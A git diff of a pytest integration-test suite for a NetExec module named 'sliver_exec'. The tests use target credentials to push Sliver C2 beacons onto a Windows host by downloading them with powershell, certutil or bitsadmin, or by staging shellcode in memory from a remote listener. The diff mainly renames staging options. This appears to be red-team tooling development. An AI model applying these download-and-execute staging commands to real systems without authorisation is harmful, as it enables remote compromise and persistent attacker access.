@@ -21,7 +21,7 @@ Environment variables (required):
 - TARGET_PASS: Target password
 - SLIVER_LISTENER_HOST: Sliver listener IP address
 - SLIVER_LISTENER_PORT: Sliver mTLS port (default: 8888)
-- SLIVER_STAGER_PORT: HTTP staging port (default: 8080)
+- SLIVER_HTTP_STAGING_PORT: HTTP staging port (default: 8080)
 """
 import os
 import pytest
@@ -40,7 +40,7 @@ TARGET_USER = os.getenv("TARGET_USER")
 TARGET_PASS = os.getenv("TARGET_PASS")
 LISTENER_HOST = os.getenv("SLIVER_LISTENER_HOST")
 LISTENER_PORT = os.getenv("SLIVER_LISTENER_PORT", "8888")
-STAGER_PORT = os.getenv("SLIVER_STAGER_PORT", "8080")
+HTTP_STAGING_PORT = os.getenv("SLIVER_HTTP_STAGING_PORT", "8080")
 SLIVER_CONFIG = os.path.expanduser("~/.sliver-client/configs/default.cfg")
 
 # Find netexec binary
@@ -199,9 +199,9 @@ class TestIntegrationHTTPStaging:
                 "-M", "sliver_exec",
                 "-o", f"RHOST={LISTENER_HOST}",
                 f"RPORT={LISTENER_PORT}",
-                "STAGING=True",
-                f"STAGER_PORT={STAGER_PORT}",
-                "STAGING_METHOD=powershell",
+                "STAGING=download",
+                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
+                "DOWNLOAD_TOOL=powershell",
                 "WAIT=120",
                 "CLEANUP=True"
             ],
@@ -234,9 +234,9 @@ class TestIntegrationHTTPStaging:
                 "-M", "sliver_exec",
                 "-o", f"RHOST={LISTENER_HOST}",
                 f"RPORT={LISTENER_PORT}",
-                "STAGING=True",
-                f"STAGER_PORT={STAGER_PORT}",
-                "STAGING_METHOD=certutil",
+                "STAGING=download",
+                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
+                "DOWNLOAD_TOOL=certutil",
                 "WAIT=120",
                 "CLEANUP=True"
             ],
@@ -266,9 +266,9 @@ class TestIntegrationHTTPStaging:
                 "-M", "sliver_exec",
                 "-o", f"RHOST={LISTENER_HOST}",
                 f"RPORT={LISTENER_PORT}",
-                "STAGING=True",
-                f"STAGER_PORT={STAGER_PORT}",
-                "STAGING_METHOD=bitsadmin",
+                "STAGING=download",
+                f"HTTP_STAGING_PORT={HTTP_STAGING_PORT}",
+                "DOWNLOAD_TOOL=bitsadmin",
                 "WAIT=120",
                 "CLEANUP=True"
             ],
@@ -326,7 +326,7 @@ class TestIntegrationMSSQLStaging:
         assert "Beacon callback detected" in result.stdout or "Waiting for beacon" in result.stdout
     
     def test_mssql_staging_direct_chunked_upload(self, check_prerequisites, sliver_cleanup):
-        """Test MSSQL with STAGING=direct uses chunked upload (old behavior)."""
+        """Test MSSQL with STAGING=none uses chunked upload (old behavior)."""
         assert TARGET_HOST and TARGET_USER and TARGET_PASS and LISTENER_HOST and NETEXEC_BIN
         result = subprocess.run(
             [
@@ -337,7 +337,7 @@ class TestIntegrationMSSQLStaging:
                 "-M", "sliver_exec",
                 "-o", f"RHOST={LISTENER_HOST}",
                 f"RPORT={LISTENER_PORT}",
-                "STAGING=direct",
+                "STAGING=none",
                 "WAIT=120",
                 "CLEANUP=True"
             ],
@@ -347,7 +347,7 @@ class TestIntegrationMSSQLStaging:
         )
         
         assert result.returncode == 0, (
-            f"MSSQL STAGING=direct failed:\n"
+            f"MSSQL STAGING=none failed:\n"
             f"STDOUT:\n{result.stdout}\n"
             f"STDERR:\n{result.stderr}"
         )
@@ -419,7 +419,7 @@ class TestIntegrationEdgeCases:
     def test_fileless_shellcode_staging_winrm(self, check_prerequisites, sliver_cleanup):
         """Test fileless TCP/HTTP shellcode injection staging (advanced mode).
         
-        This triggers shellcode staging by setting STAGING=True without STAGER_PORT.
+        This triggers shellcode staging by setting STAGING=download without HTTP_STAGING_PORT.
         The bootstrap downloads shellcode from a stager listener and executes in memory.
         
         This test verifies the fix for the 17MB payload issue:
@@ -437,10 +437,10 @@ class TestIntegrationEdgeCases:
                 "-M", "sliver_exec",
                 "-o", f"RHOST={LISTENER_HOST}",
                 f"RPORT={LISTENER_PORT}",
-                "STAGING=True",
-                "STAGER_PROTOCOL=http",
-                f"STAGER_RHOST={LISTENER_HOST}",
-                "STAGER_RPORT=9999",
+                "STAGING=download",
+                "SHELLCODE_PROTOCOL=http",
+                f"SHELLCODE_LISTENER_HOST={LISTENER_HOST}",
+                "SHELLCODE_LISTENER_PORT=9999",
                 "WAIT=120",
                 "CLEANUP=True"
             ],
